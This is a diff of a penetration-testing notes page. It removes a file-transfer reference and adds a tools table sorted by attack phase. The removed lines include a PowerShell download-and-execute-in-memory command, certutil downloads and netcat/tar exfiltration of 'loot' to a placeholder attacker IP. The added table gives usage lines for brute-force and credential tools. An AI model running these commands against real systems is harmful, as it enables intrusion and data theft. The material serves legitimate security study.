@@ -1,104 +1,69 @@
 ---
-title: "Reference — File Transfer Methods"
-date: 2025-12-02
-categories:
-  - Tools & Methodologies
-  - Reference
-tags: [Methodology, File Transfer, Python HTTP Server, Netcat, PowerShell, certutil, SMB, Exfiltration]
-description: "File transfer reference — Linux and Windows download/upload methods, netcat transfers, SMB server, base64 encode/decode, and exfiltration techniques."
+title: "Reference — Tools Master List"
+categories: [Tools & Methodologies, Reference]
+tags: [methodology, tools, nmap, bloodhound, impacket, hashcat, reference]
 ---
 
-> 📁 **Source:** [github.com/sireton/pentest-vault/00-Meta](https://github.com/sireton/pentest-vault)  
-> ← [Back to Methodology Index](/posts/methodology-index/)
+> 📁 **Source:** [github.com/sireton/pentest-vault](https://github.com/sireton/pentest-vault)
 
----
+Full tool reference organized by phase: recon, web, exploitation, post-exploitation, and password attacks.
 
-#meta #filetransfer #windows #linux
-
-## Linux → Target
-
-### Python HTTP Server
-```bash
-# Attacker
-python3 -m http.server 8080
-
-# Victim
-wget http://<IP>:8080/<file>
-curl -O http://<IP>:8080/<file>
-```
-
-### Netcat
-```bash
-# Receiver
-nc -lvnp 4444 > file.exe
-
-# Sender
-nc -w 3 <IP> 4444 < file.exe
-```
+← [Back to Methodology Index](/posts/methodology-index/)
 
 ---
 
-## Windows Download Methods
+## Recon & Enumeration
 
-### PowerShell
-```powershell
-# Download and execute in memory
-IEX (New-Object Net.WebClient).DownloadString('http://<IP>/file.ps1')
+| Tool | Purpose | Command Ref |
+|---|---|---|
+| nmap | Port scanning | [Recon Index](/posts/methodology-recon/) |
+| masscan | Fast port sweep | `masscan -p1-65535 <IP> --rate=1000` |
+| ffuf | Directory/vhost fuzzing | [Recon Index](/posts/methodology-recon/) |
+| gobuster | Dir/DNS brute force | `gobuster dir -u <url> -w <wordlist>` |
+| amass | Subdomain enumeration | `amass enum -d <domain>` |
+| theHarvester | OSINT email/subdomain | `theHarvester -d <domain> -b all` |
+| enum4linux-ng | SMB/LDAP enumeration | [Recon Index](/posts/methodology-recon/) |
 
-# Download to disk
-(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Windows\Temp\file.exe')
+## Web Attacks
 
-# Invoke-WebRequest
-Invoke-WebRequest -Uri 'http://<IP>/file.exe' -OutFile 'C:\Temp\file.exe'
-```
+| Tool | Purpose | Command Ref |
+|---|---|---|
+| Burp Suite | Web proxy / scanner | [Web Attacks Index](/posts/methodology-web-attacks/) |
+| sqlmap | SQL injection automation | [Web Attacks Index](/posts/methodology-web-attacks/) |
+| nikto | Web server scanner | `nikto -h <url>` |
+| wfuzz | Web fuzzer | `wfuzz -c -w <wordlist> <url>/FUZZ` |
+| whatweb | Web tech fingerprint | `whatweb <url>` |
 
-### Certutil (LOLBin)
-```cmd
-certutil.exe -urlcache -split -f http://<IP>/file.exe file.exe
-```
+## Exploitation
 
-### SMB Server (impacket)
-```bash
-# Attacker
-impacket-smbserver share $(pwd) -smb2support -username user -password pass
+| Tool | Purpose | Command Ref |
+|---|---|---|
+| metasploit | Exploitation framework | `msfconsole` |
+| searchsploit | Exploit search | `searchsploit <service> <version>` |
+| evil-winrm | WinRM shell | `evil-winrm -i <IP> -u <user> -p <pass>` |
+| impacket | Windows/AD attacks | [AD Index](/posts/methodology-active-directory/) |
+| crackmapexec | SMB/AD Swiss Army knife | [AD Index](/posts/methodology-active-directory/) |
 
-# Victim
-copy \\<IP>\share\file.exe C:\Temp\
-```
+## Post-Exploitation
+
+| Tool | Purpose | Command Ref |
+|---|---|---|
+| linpeas / winpeas | Privilege esc enumeration | [Post-Exploitation Index](/posts/methodology-post-exploitation/) |
+| BloodHound | AD attack path mapping | [Active Directory](/posts/methodology-active-directory/) |
+| mimikatz | Credential dumping | [Active Directory](/posts/methodology-active-directory/) |
+| rubeus | Kerberos attacks | [Active Directory](/posts/methodology-active-directory/) |
+| chisel | Tunneling/pivoting | [Lateral Movement Index](/posts/methodology-lateral-movement/) |
+| ligolo-ng | Layer 3 pivoting | [Lateral Movement Index](/posts/methodology-lateral-movement/) |
+
+## Password Attacks
+
+| Tool | Purpose | Command Ref |
+|---|---|---|
+| hashcat | Hash cracking (GPU) | `hashcat -m <mode> <hash> <wordlist>` |
+| john | Hash cracking (CPU) | `john --wordlist=<wl> <hash>` |
+| hydra | Online brute force | `hydra -l <user> -P <wl> <IP> <service>` |
+| kerbrute | Kerberos user enum | `kerbrute userenum -d <domain> <wordlist>` |
 
 ---
 
-## Linux Download Methods
-```bash
-wget http://<IP>/file -O /tmp/file
-curl http://<IP>/file -o /tmp/file
-```
-
-### Base64 Encode/Decode (no outbound HTTP)
-```bash
-# Attacker
-base64 -w 0 file.exe > file.b64
-
-# Victim
-echo "<base64string>" | base64 -d > file.exe
-```
-
----
-
-## Exfiltration
-
-### Netcat
-```bash
-# Attacker receives
-nc -lvnp 4444 > loot.zip
-
-# Victim sends
-tar czf - /path/to/loot | nc <IP> 4444
-```
-
-### SCP
-```bash
-scp user@<victimIP>:/etc/passwd ./loot/passwd
-```
-
-*Previous: [Methodology Tools](/posts/methodology-tools/) · Next: [Methodology Resources](/posts/methodology-resources/)*
+*Previous: [Methodology Reporting](/posts/methodology-reporting/) · Next: [Methodology File Transfers](/posts/methodology-file-transfers/)*
